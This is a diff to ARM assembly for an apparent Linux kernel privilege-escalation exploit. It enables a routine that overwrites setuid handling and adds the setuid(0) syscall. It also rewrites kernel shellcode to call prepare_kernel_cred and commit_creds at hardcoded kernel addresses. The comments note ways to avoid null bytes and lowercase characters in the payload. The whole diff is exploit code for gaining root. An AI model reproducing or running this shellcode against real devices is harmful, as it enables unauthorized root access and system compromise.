@@ -27,7 +27,7 @@ _start:
     bl _print
 
     @ overrite setuid
-    @ bl _overwrite_setuid
+    bl _overwrite_setuid
     bl _trigger_setuid
 
     
@@ -99,6 +99,7 @@ _trigger_setuid:   @ setuid(0)
                    @ so we should be good 
     mov r7, #0x17
     mov r0, #0
+    swi #0
     mov pc, lr
 
 @ getuid confirmed to be working
@@ -129,27 +130,36 @@ _addr:
 
 _shellcode:
     @ 8003f44c T prepare_creds
-    adr r9, _prepare_kernel_creds
-    ldr r9, [r9]
-    mov r0, #0 @ daemon = NULL
+    @ r0 should contain our setuid 0
+    @ shouldn't be a problem
+    @adr r9, _prepare_kernel_creds
+    @ldr r9, [r9]
+    @ that's a good replacement
+    movw r9, #0xf924
+    movt r9, #0x8003
     mov lr, pc
     mov pc, r9
 
     @ move pointer to creds to r6
-    mov r6, r0 
+    @ we're not messing with r0 so that 
+    @ shouldn't be a problem
+    @mov r6, r0 
     @ edit creds
     @ NOT IMPLEMENTED
 
     @ commit  creds
     @ calc commit creds address
-    adr r9, _commit_creds
-    ldr r9, [r9]
+    @adr r9, _commit_creds
+    @ldr r9, [r9]
+    @ replacement for nulls
+    movw r9, 0xf560
+    movt r9, 0x8003
     @ commit creds address had 0x6c in it
     @ which is a lowercase letter and not good for us
     add r9, r9, #0xc
     @ move the pointer of creds in r6
     @ to r0
-    mov r0, r6
+    @mov r0, r6
     mov lr, pc
     mov pc, r9
 
